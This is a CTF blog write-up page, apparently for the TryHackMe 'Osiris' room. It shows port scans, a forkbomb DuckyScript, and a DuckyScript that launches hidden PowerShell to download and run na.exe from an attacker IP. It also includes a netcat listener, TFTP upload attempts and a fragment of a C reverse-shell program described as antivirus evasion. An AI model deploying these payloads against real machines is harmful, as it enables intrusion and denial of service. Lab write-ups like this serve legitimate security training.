@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="57x57" href="../../../favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="../../../favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="../../../favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="../../../favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="../../../favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="../../../favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="../../../favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="../../../favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="../../../favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../../favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="../../../favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../../favicon/favicon-16x16.png">
+    <link rel="manifest" href="../../../favicon/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="../../../favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>Room: Osiris - TryHackMe Write-up</title>
+    <meta name="description"
+        content="A comprehensive guide to the Osiris room on TryHackMe, featuring RubberDucky attacks and antivirus evasion techniques.">
+    <meta name="date" content="2025-05-31">
+    <meta name="author" content="UZIII2208">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <link href="../../../css/styles.css" rel="stylesheet">
+</head>
+
+<body class="min-h-screen">
+    <!-- Navigation -->
+    <nav class="fixed top-0 w-full bg-gray-900 shadow-lg z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center">
+                    <a href="/" class="text-green-400 hover:text-green-500 font-bold text-xl">UZIII2208</a>
+                </div>
+                <!-- Desktop Menu -->
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-4">
+                        <a href="/" class="nav-link px-3 py-2">Home</a>
+                        <a href="/pages/about.html" class="nav-link px-3 py-2">About</a>
+                        <a href="/pages/blogs.html" class="nav-link px-3 py-2">Blogs</a>
+                        <a href="/pages/hackthebox.html" class="nav-link px-3 py-2">HackTheBox</a>
+                        <a href="/pages/tryhackme.html" class="nav-link px-3 py-2">TryHackMe</a>
+                        <a href="/pages/contact.html" class="nav-link px-3 py-2">Contact</a>
+                        <a href="/pages/complaints.html" class="nav-link px-3 py-2">Complaints</a>
+                        <div class="flex items-center space-x-4">
+                            <button onclick="toggleSearch()" class="theme-toggle search-button">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                                </svg>
+                            </button>
+                            <button id="theme-toggle" onclick="toggleTheme()" class="theme-toggle">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                                    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
+                                </svg>
+                            </button>
+                            <button onclick="showVisitCount()" class="theme-toggle" id="visit-counter" title="Show Visit Count">
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Mobile menu button -->
+                <div class="md:hidden">
+                    <button onclick="toggleMobileMenu()" class="text-gray-300 hover:text-white">
+                        <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <!-- Mobile Menu -->
+        <div id="mobile-menu" class="hidden md:hidden fixed inset-0 z-50">
+            <!-- Backdrop with blur effect -->
+            <div class="absolute inset-0 bg-black bg-opacity-50 backdrop-blur-sm" onclick="toggleMobileMenu()"></div>
+            <!-- Menu Content -->
+            <div class="relative h-full flex items-center justify-center" onclick="event.stopPropagation()">
+                <div class="bg-gray-900 rounded-lg shadow-xl p-6 m-4 max-w-sm w-full transform transition-all relative">
+                    <!-- Exit button -->
+                    <button onclick="toggleMobileMenu()" class="absolute top-2 right-2 text-gray-400 hover:text-white p-2 hover:bg-gray-800 rounded-lg transition-all duration-300">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                    </button>
+                    <div class="space-y-4 mt-6">
+                        <a href="/" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">Home</a>
+                        <a href="/pages/about.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">About</a>
+                        <a href="/pages/blogs.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">Blogs</a>
+                        <a href="/pages/hackthebox.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">HackTheBox</a>
+                        <a href="/pages/tryhackme.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">TryHackMe</a>
+                        <a href="/pages/contact.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">Contact</a>
+                        <a href="/pages/complaints.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">Complaints</a>
+                        <div class="flex items-center flex-col space-y-4 mt-6">
+                            <!-- Mobile Search Container -->
+                            <div id="mobile-search-container" class="search-container hidden fixed inset-0 z-50">
+                                <!-- Backdrop with blur effect -->
+                                <div class="absolute inset-0 bg-black bg-opacity-50 backdrop-blur-sm" onclick="toggleMobileSearch()"></div>
+                                <!-- Search Content -->
+                                <div class="relative h-full flex items-center justify-center" onclick="event.stopPropagation()">
+                                    <div class="bg-gray-900 rounded-lg shadow-xl p-6 m-4 max-w-2xl w-full transform transition-all">
+                                        <div class="relative">
+                                            <input type="text" id="mobile-search-input" class="search-input w-full rounded-lg bg-gray-800 border-2 border-green-400 text-gray-100 pr-10" placeholder="Search posts..." oninput="performSearch(event)" autofocus>
+                                            <button onclick="toggleMobileSearch()" class="absolute right-2 top-2 text-gray-400 hover:text-white">
+                                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                                                </svg>
+                                            </button>
+                                        </div>
+                                        <div id="mobile-search-results" class="search-results hidden mt-4 max-h-96 overflow-y-auto"></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="flex space-x-4">
+                                <button onclick="toggleMobileSearch()" class="theme-toggle search-button p-2 hover:bg-gray-800 rounded-lg">
+                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                                    </svg>
+                                </button>
+                                <button onclick="toggleTheme()" class="theme-toggle p-2 hover:bg-gray-800 rounded-lg">
+                                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                                        <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
+                                    </svg>
+                                </button>
+                                <button onclick="showVisitCount()" class="theme-toggle p-2 hover:bg-gray-800 rounded-lg" title="Show Visit Count">
+                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Search Overlay -->
+    <div id="search-overlay" class="search-overlay fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm hidden z-50">
+        <div class="absolute inset-0" onclick="closeSearch()"></div>
+        <div class="relative min-h-screen flex items-center justify-center">
+            <div class="bg-gray-900 rounded-lg shadow-xl p-6 m-4 max-w-2xl w-full transform transition-all">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="text-xl font-semibold text-green-400">Search Posts</h3>
+                    <button onclick="closeSearch()" class="text-gray-400 hover:text-white p-2 hover:bg-gray-800 rounded-lg transition-all duration-300">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                    </button>
+                </div>
+                <div class="search-container w-full">
+                    <input type="text" id="search-input" class="search-input w-full bg-gray-800 text-white rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-green-400" placeholder="Search posts..." oninput="performSearch(event)">
+                    <div id="search-results" class="search-results mt-4 max-h-96 overflow-y-auto"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="pt-20 container mx-auto px-4 sm:px-6 lg:px-8">
+        <article class="max-w-4xl mx-auto py-16 fade-in">
+            <header class="mb-12">
+                <h1 class="text-4xl md:text-6xl text-green-400 font-bold mb-4">Osiris: Insane - TryHackMe Challenge Room</h1>
+                <div class="flex items-center space-x-4 text-gray-400">
+                    <time datetime="2025-05-31">May 31, 2025</time>
+                    <span>•</span>
+                    <span>TryHackMe</span>
+                    <span>•</span>
+                    <span class="text-purple-400">Insane</span>
+                </div>
+            </header>
+
+            <div class="prose prose-lg prose-invert max-w-none">
+                <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/fe8053432e57f1958c78240c42e094a2.png"
+                    alt="Osiris Room Banner" class="w-full rounded-lg shadow-lg mb-8">
+
+                <h2 class="text-2xl text-green-400 mt-8 mb-4">Room Story</h2>
+                <div class="text-gray-400 bg-gray-800 p-6 rounded-lg mb-8">
+                    <p class="mb-4">
+                        As a final blow to Windcorp's security, you intend to hack the laptop of the CEO, Charlotte Johnson.
+                        You heard she has a boatload of Bitcoin, and those seem mighty tasty to you. But they have learned
+                        from the previous hacks and have introduced strict security measures.
+                    </p>
+                    <p>
+                        Your attack vector involves a WiFi RubberDucky dropped strategically on her driveway. When Charlotte
+                        and her assistant Alcino arrive, he picks up the bait as they enter the building. From your black
+                        van outside the house, you await their connection to the RubberDucky to deliver your payload.
+                    </p>
+                </div>
+
+                <h2 class="text-2xl text-green-400 mt-8 mb-4">Initial Reconnaissance</h2>
+                <p class="mb-4">First, let's perform some initial port scanning to understand our target. I used both Rustscan and Nmap for comprehensive scanning:</p>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>┌──(kali㉿kali)-[~]
+└─$ rustscan -a 10.10.134.236 --ulimit 5500 -b 65535 -- -A -Pn
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5500.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</code></pre>
+
+                <p class="mb-4">Following up with Nmap for a more detailed scan:</p>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>┌──(kali㉿kali)-[~]
+└─$ nmap -sC -sV -p- -Pn 10.10.134.236 -vv --min-rate 1500
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 19:24 EST
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:24
+Completed NSE at 19:24, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:24
+Completed NSE at 19:24, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:24
+Completed NSE at 19:24, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 19:24
+Completed Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed
+Initiating Connect Scan at 19:24
+Scanning 10.10.134.236 [65535 ports]
+Connect Scan Timing: About 23.54% done; ETC: 19:26 (0:01:41 remaining)
+Connect Scan Timing: About 46.60% done; ETC: 19:26 (0:01:10 remaining)
+Connect Scan Timing: About 69.72% done; ETC: 19:26 (0:00:40 remaining)
+Completed Connect Scan at 19:26, 130.84s elapsed (65535 total ports)
+Initiating Service scan at 19:26
+NSE: Script scanning 10.10.134.236.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:26
+Completed NSE at 19:26, 5.01s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+Nmap scan report for 10.10.134.236
+Host is up, received user-set.
+Scanned at 2023-01-02 19:24:34 EST for 136s
+All 65535 scanned ports on 10.10.134.236 are in ignored states.
+Not shown: 65535 filtered tcp ports (no-response)
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 19:26
+Completed NSE at 19:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 138.08 seconds</code></pre>
+
+                <div class="bg-yellow-900 bg-opacity-20 border-l-4 border-yellow-400 p-4 mb-8">
+                    <p class="text-yellow-200">Key Finding: All ports are filtered, indicating extremely strict firewall rules are in place.</p>
+                </div>               
+
+                <h2 class="text-2xl text-green-400 mt-8 mb-4">RubberDucky Research & Testing</h2>
+                <p class="mb-4">I began by researching various RubberDucky techniques and testing different approaches:</p>
+
+                <h3 class="text-xl text-green-400 mt-6 mb-3">1. Linux Forkbomb Test</h3>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>REM Forkbomb to crash Linux machines
+DEFAULT_DELAY 700
+ALT T
+STRING :(){ :!:& };:
+ENTER</code></pre>
+
+                <h3 class="text-xl text-green-400 mt-6 mb-3">2. Chrome Automation Test</h3>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>DELAY 5000
+GUI r
+DELAY 50
+STRING chrome www.jesusninoc.com
+ENTER
+DELAY 1000
+F11</code></pre>
+
+                <div class="bg-gray-800 p-6 rounded-lg mb-8">
+                    <h4 class="text-green-400 mb-3">Research Resources:</h4>
+                    <ul class="list-disc list-inside space-y-2">
+                        <li class="text-gray-300"><a href="https://github.com/UndedInside/DuckyScripts" class="text-green-400 hover:text-green-500">UndedInside's DuckyScripts Repository</a></li>
+                        <li class="text-gray-300"><a href="https://www.jesusninoc.com/03/09/scripts-en-rubber-ducky-parte-1/" class="text-green-400 hover:text-green-500">Jesus Ninoc's RubberDucky Guide</a></li>
+                        <li class="text-gray-300"><a href="https://forums.hak5.org/topic/42442-3-second-powershell-execution" class="text-green-400 hover:text-green-500">Hak5 Forum - PowerShell Execution Techniques</a></li>
+                        <li class="text-gray-300"><a href="https://github.com/insecurityofthings/jackit/wiki" class="text-green-400 hover:text-green-500">JackIt Documentation</a></li>
+                    </ul>
+                </div>
+
+                <h3 class="text-xl text-green-400 mt-6 mb-3">3. Payload Reference Documentation</h3>
+                <div class="bg-gray-800 p-6 rounded-lg mb-8">
+                    <p class="text-gray-300 mb-4">Key documentation consulted:</p>
+                    <ul class="list-disc list-inside space-y-2">
+                        <li class="text-gray-300"><a href="https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference" class="text-green-400 hover:text-green-500">DuckyScript Quick Reference</a></li>
+                        <li class="text-gray-300"><a href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration#network-medium-exfiltration" class="text-green-400 hover:text-green-500">Network Medium Exfiltration Guide</a></li>
+                        <li class="text-gray-300"><a href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration#physical-medium-exfiltration" class="text-green-400 hover:text-green-500">Physical Medium Exfiltration Guide</a></li>
+                    </ul>
+                </div>
+
+                <h3 class="text-xl text-green-400 mt-6 mb-3">4. Tool Preparation</h3>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>┌──(kali㉿kali)-[~]
+└─$ locate nc64.exe 
+/home/kali/hackthebox/nc64.exe
+/home/kali/msdt-follina/msdt-follina/nc64.exe
+/home/kali/ra2/nc64.exe
+
+└─$ cp /home/kali/ra2/nc64.exe nc64.exe
+└─$ chmod +x nc64.exe</code></pre>
+
+                <h3 class="text-xl text-green-400 mt-6 mb-3">5. Attack Infrastructure Setup</h3>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
+                    <div class="bg-gray-800 p-4 rounded-lg">
+                        <h4 class="text-green-400 mb-2">HTTP Server:</h4>
+                        <pre class="text-gray-400"><code>python3 -m http.server 1337</code></pre>
+                    </div>
+                    <div class="bg-gray-800 p-4 rounded-lg">
+                        <h4 class="text-green-400 mb-2">Listener Setup:</h4>
+                        <pre class="text-gray-400"><code>rlwrap nc -lnvp 4444</code></pre>
+                    </div>
+                </div>
+
+                <h3 class="text-xl text-green-400 mt-6 mb-3">6. TFTP Payload Testing</h3>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>tftp> put rev.txt
+Transfer timed out.
+
+tftp> status
+Connected to 10.10.134.236.
+Mode: netascii Verbose: off Tracing: off Literal: off
+Rexmt-interval: 5 seconds, Max-timeout: 25 seconds</code></pre>
+
+                <div class="bg-yellow-900 bg-opacity-20 border-l-4 border-yellow-400 p-4 mb-8">
+                    <p class="text-yellow-200">Note: Initial TFTP transfer attempts failed, indicating possible network restrictions or antivirus interference.</p>
+                </div>
+
+                <h3 class="text-xl text-green-400 mt-6 mb-3">7. Alternative Delivery Attempt</h3>
+                <p class="text-gray-300 mb-4">Created new payload with modified netcat executable:</p>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>DELAY 500
+GUI r
+DELAY 500
+STRING powershell -W hidden
+ENTER
+DELAY 1000
+ENTER
+STRING Invoke-WebRequest http://10.8.19.103/na.exe -outfile c:\windows\temp\na.exe
+ENTER
+DELAY 1000
+STRING c:\windows\temp\na.exe
+ENTER</code></pre>
+
+                <h2 class="text-2xl text-green-400 mt-8 mb-4">Antivirus Evasion Attempt</h2>
+                <p class="mb-4">After the initial payload was blocked, I developed a custom C program to evade detection:</p>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+
+#define DEFAULT_BUFLEN 1024
+
+typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
+typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
+typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
+typedef u_short(WSAAPI* HTONS)(u_short hostshort);
+typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
+typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
+typedef int(WSAAPI* WSACLEANUP)(void);</code></pre>
+
+                <div class="bg-blue-900 bg-opacity-20 border-l-4 border-blue-400 p-4 mb-8">
+                    <h4 class="text-blue-400 mb-2">Technical Details:</h4>
+                    <ul class="list-disc list-inside space-y-2">
+                        <li >Uses function pointer declarations to avoid direct API calls</li>
+                        <li >Implements custom socket programming to bypass network monitoring</li>
+                        <li >Dynamically loads WinSock functions to evade static analysis</li>
+                    </ul>
+                </div>
+
+                <h2 class="text-2xl text-green-400 mt-8 mb-4">Compilation and Testing</h2>
+                <pre class="text-gray-400 bg-gray-800 p-4 rounded-lg overflow-x-auto mb-4"><code>┌──(kali㉿kali)-[~/Osiris]
+└─$ i686-w64-mingw32-gcc na.c -o na.exe       
+└─$ ls
+DefenderCheck  na.c  na.exe  nc64.exe  rev.txt</code></pre>
+
+                <h2 class="text-2xl text-green-400 mt-8 mb-4">Step by Step Pwn This Challenge</h2>
+                <iframe src="tryhackme" class="w-full h-64 bg-gray-800 p-2 rounded-lg overflow-x-auto"></iframe>
+
+                <h2 class="text-2xl text-green-400 mt-8 mb-4">Final Solution</h2>
+                <div class="bg-gray-800 p-6 rounded-lg mb-8">
+                    <p class="text-gray-300 mb-4">The successful solution required:</p>
+                    <ol class="list-decimal list-inside space-y-2">
+                        <li class="text-gray-300">Moving to TryHackMe's AttackBox for payload execution</li>
+                        <li class="text-gray-300">Installing necessary tools: <code>apt install tftp</code></li>
+                        <li class="text-gray-300">Careful payload crafting to bypass security measures</li>
+                        <li class="text-gray-300">Proper timing and execution sequence</li>
+                    </ol>
+                </div>
+
+                <div class="bg-green-900 bg-opacity-20 border-l-4 border-green-400 p-4">
+                    <h4 class="text-green-400 mb-2">Key Takeaways:</h4>
+                    <ul class="list-disc list-inside space-y-2">
+                        <li>Always test payloads in a controlled environment first</li>
+                        <li>Consider antivirus evasion techniques from the start</li>
+                        <li>Use alternative attack platforms when local attempts fail</li>
+                        <li>Document and understand each step of the attack process</li>
+                    </ul>
+                </div>
+            </div>
+        </article>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 mt-20">
+        <div class="max-w-7xl mx-auto py-12 px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div>
+                    <h3 class="text-green-400 font-semibold mb-4">About</h3>
+                    <p class="text-gray-400">Security research blog focusing on CTF write-ups, penetration testing, and
+                        cybersecurity insights.</p>
+                </div>
+                <div>
+                    <h3 class="text-green-400 font-semibold mb-4">Quick Links</h3>
+                    <ul class="space-y-2">
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-green-400 font-semibold mb-4">Connect</h3>
+                    <ul class="space-y-2">
+                    </ul>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 mt-8 pt-8 text-center">
+                <p class="text-gray-400">&copy; 2025 UZIII2208. Some rights reserved.</p>
+                <p class="text-gray-500 text-sm mt-2">Built with Meow Meow :3</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="../../../js/main.js"></script>
+    <script type="module" src="../../../js/background.js"></script>
+</body>
+
+</html>
